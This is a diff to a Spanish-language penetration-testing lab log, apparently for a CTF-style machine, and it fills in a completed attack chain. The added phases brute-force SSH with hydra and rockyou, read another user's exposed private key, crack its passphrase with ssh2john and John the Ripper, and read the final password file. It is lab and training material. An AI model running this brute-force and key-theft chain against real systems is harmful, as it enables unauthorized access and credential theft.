@@ -50,11 +50,34 @@ cat staff.txt
 --- FASE 4: EXPLOTACIÓN (FUERZA BRUTA SSH) ---
 # Ataque de diccionario contra el usuario jan por SSH:
 hydra -l jan -P /usr/share/wordlists/rockyou.txt <IP_OBJETIVO> ssh -t 4 -f
+# Resultado: credencial obtenida -> usuario jan (acceso exitoso).
 
-# Observación: el servicio SSH limita la tasa de intentos (~30/min),
-# lo que ralentiza el ataque. Se confirma la viabilidad del vector
-# dada la política de contraseñas débil (ver informe, hallazgo H-05).
-# [Pendiente de completar en próxima sesión de laboratorio.]
+# Acceso remoto como jan:
+ssh jan@<IP_OBJETIVO>
+
+--- FASE 5: ESCALADA DE PRIVILEGIOS ---
+# Enumeración de usuarios y carpetas:
+ls -la /home
+ls -la /home/kay/.ssh
+# Hallazgo: clave privada id_rsa de kay con permisos de lectura
+# para otros usuarios (mala configuración).
+
+# Lectura y copia de la clave privada de kay:
+cat /home/kay/.ssh/id_rsa   # (se copió a la máquina atacante)
+
+# Crackeo offline de la passphrase de la clave con John the Ripper:
+ssh2john kay_rsa > kay_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash.txt
+# Resultado: passphrase de la clave obtenida.
+
+# Acceso como kay usando la clave privada:
+chmod 600 kay_rsa
+ssh -i kay_rsa kay@<IP_OBJETIVO>
+
+# Lectura de la contraseña final (post-explotación):
+ls -la
+cat pass.bak
+# Resultado: contraseña final obtenida. Cadena de ataque completa.
 
 ===============================================================
  NOTA: todas las acciones se realizaron exclusivamente contra la
